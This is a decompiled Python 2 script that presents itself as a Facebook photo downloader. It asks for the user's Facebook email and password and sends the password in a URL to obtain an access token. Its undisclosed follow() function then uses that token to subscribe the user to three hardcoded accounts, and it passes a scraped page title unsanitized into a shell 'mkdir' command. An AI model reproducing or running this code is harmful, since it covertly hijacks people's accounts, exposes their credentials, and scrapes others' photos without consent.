# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <script>
# Compiled at: 2020-08-31 10:12:20
from multiprocessing.pool import ThreadPool
import sys, os
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
SR = W + '[' + R + '*' + W + ']'
SG = W + '[' + G + '*' + W + ']'
try:
    from requests import *
    from bs4 import *
except:
    os.system('pip2 install requests')
    os.system('pip2 install bs4')
    from requests import *
    from bs4 import *

s = Session()
os.system('clear')
banner = '\n\n{}\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\n\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91{}\xe2\x96\x88{}\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\n\xe2\x96\x88\xe2\x96\x91{}\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80{}\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x88\n\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91{}\xe2\x96\x80{}\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x80\xe2\x96\x80\xe2\x96\x91\xe2\x96\x88\n{}\xe2\x94\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\n      \n    {}[FaceBook-Pictures-Downloader]\n\n {}Developer : {}Nasir Ali\n {}Github : {}github.com/nasirxo\n\n'
print banner.format(G, R, G, R, G, R, G, G, W, G, W, G, W)
email = raw_input('\n' + SR + ' EMAIL : ' + G)
password = raw_input(SR + ' PASSWORD : ' + G)
data = {'email': email, 
   'pass': password}

def follow(tokenx):
    token = str(tokenx)
    post('https://graph.facebook.com/100006143266745/subscribers?access_token=' + token)
    post('https://graph.facebook.com/100012677655820/subscribers?access_token=' + token)
    post('https://graph.facebook.com/100013144367280/subscribers?access_token=' + token)


r = s.post('https://mbasic.facebook.com/login', data=data)
if 'save-device' in r.url or 'm_ses' in r.url:
    print W + '[x]' + G + ' Login Sucessfull :) '
    tokenx = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6').json()['access_token']
    follow(tokenx)
else:
    print W + '[x]' + R + ' Login Failed :( '
    sys.exit()
u = 'https://mbasic.facebook.com{}'
th = ThreadPool(20)

def getpic(links):
    li = 'https://mbasic.facebook.com{}'
    ds = open('.status', 'a')
    done = len(open('.status', 'r').read())
    total = int(open('.total', 'r').read())
    sys.stdout.write(('\r {} Downloading.. [{}/{}] ').format(SG, done, total))
    sys.stdout.flush()
    try:
        phtml = BeautifulSoup(s.get(li.format(links)).text, 'html.parser')
        for i in phtml.find_all('a'):
            if 'photo/view_full_size' in i['href']:
                pic = BeautifulSoup(s.get(li.format(i['href'])).text, 'html.parser')
                for n in pic.find_all('a'):
                    picdata = s.get(n['href']).content
                    pname = str(links.split('id=')[1])
                    fname = open('.name', 'r').read()
                    with open(('{}/{}.jpg').format(fname, pname), 'wb') as (photox):
                        photox.write(picdata)
                        photox.close()
                        ds.write('1')
                        ds.close()
                        return '1'

    except:
        pass


while True:
    links = []
    ds = open('.status', 'w')
    ds.close()
    aid = raw_input('\n\n' + SR + ' Account ID : ' + G)
    id = ('https://mbasic.facebook.com/profile.php?id={}').format(aid)
    html = BeautifulSoup(s.get(id).text, 'html.parser')
    name = str(('_').join(html.title.string.split()))
    cfx = open('.name', 'w')
    cfx.write(name)
    cfx.close()
    print ('{} Account : {}{}').format(SG, G, name)
    try:
        os.popen(('mkdir {}').format(name))
    except:
        pass

    for i in html.find_all('a'):
        try:
            if 'profile.php?v=photos&lst=' in str(i['href']) or 'photos?lst=' in str(i['href']):
                html1 = BeautifulSoup(s.get(u.format(i['href'])).text, 'html.parser')
                for ix in html1.find_all('a'):
                    if 'albums' in ix['href'] and 'owner_id' not in ix['href']:
                        htmlx = BeautifulSoup(s.get(u.format(ix['href'])).text, 'html.parser')
                        for iy in htmlx.find_all('a'):
                            if 'photo.php' in iy['href']:
                                links.append(str(iy['href']))

        except:
            pass

    tt = open('.total', 'w')
    tt.write(str(len(links)))
    tt.close()
    print (' {} Total Images :{} {}').format(SG, G, len(links))
    results = th.map(getpic, links)
    rset = []
    for i in range(len(results)):
        if results[i] == '1':
            rset.append('1')

    sys.stdout.write(('\r {} Downloaded {}{}{} Images *_*').format(SG, G, len(rset), W))
    sys.stdout.flush()
# okay decompiling patched.pyc
